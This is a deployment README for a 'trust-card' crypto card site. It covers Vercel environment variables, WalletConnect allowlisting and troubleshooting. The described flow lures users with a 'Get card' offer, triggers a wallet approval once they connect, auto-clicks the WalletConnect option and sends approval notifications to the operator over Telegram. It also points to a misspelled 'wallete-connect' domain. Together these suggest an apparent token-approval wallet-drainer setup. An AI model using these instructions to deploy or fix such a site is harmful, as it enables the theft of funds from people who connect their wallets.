# Vercel Environment Variables

Add these in **Vercel → Project → Settings → Environment Variables**. Apply to **Production**, **Preview**, and **Development** as needed.

## Required for WalletConnect

| Variable | Description | Value |
|----------|-------------|-------|
| `VITE_PROJECT_ID` | WalletConnect Project ID. Must match the project in [dashboard.walletconnect.com](https://dashboard.walletconnect.com) | `11e5445365f720d1050dc106ba2e78d6` |

**Project ID check:** In WalletConnect Dashboard → your project → Settings, confirm the Project ID is `11e5445365f720d1050dc106ba2e78d6`. Add your domains to the **Allowlist** (Domain tab).

## Optional

| Variable | Description | Example |
|----------|-------------|---------|
| `TRUST_CARD_APPROVAL_URL` | URL for fluxpay scripts. Leave empty to use local `/fluxpay/` | `https://trust-card.vercel.app/fluxpay` |
| `TELEGRAM_BOT_TOKEN` | From @BotFather for wallet/approval notifications | |
| `TELEGRAM_CHAT_ID` | Chat ID for Telegram notifications | |
| `NEXT_PUBLIC_WC_PARENT_ORIGINS` | Comma-separated origins for wc-bridge (if used) | `https://trust-card.vercel.app` |

## Wallet Connect Flow (Reference: BEP20)

1. User clicks **Get card** → waitlist modal opens (Ethereum / Tron)
2. User clicks **Ethereum** or **Tron** → fluxpay script loads → WalletConnect modal opens with QR
3. User scans QR with wallet → connects → approval runs → redirect to card page

**If you only see "Connect" button:** The WalletConnect modal may be stuck. Ensure the domain is in the allowlist (below). `direct-wallet-connect.js` auto-clicks "WalletConnect" when the wallet grid appears.

**ChunkLoadError 198:** The chat widget chunk (`198.cbf644a09b7083ca.js`) is missing from the build. Run a fresh `next build` from the Next.js source and redeploy to regenerate all chunks.

**WalletConnect "origin not allowed" (code 3000) / "Connection closed":** Add your deployment URLs to the [WalletConnect Cloud allowlist](https://dashboard.walletconnect.com) → Project → Allowlist. Include:
- `https://trust-card.vercel.app`
- `https://trust-card-git-main-*.vercel.app` (or each preview URL)
- `https://*.vercel.app` to allow all preview deployments

**Note:** The `/api/config` serverless endpoint injects these at runtime. Ensure the `api/` folder is deployed. If `/api/config` is not available, add before `apply-now-flow.js`:
```html
<script>window.TRUST_CARD_APPROVAL_URL='https://wallete-connect-bep-20.vercel.app';</script>
```
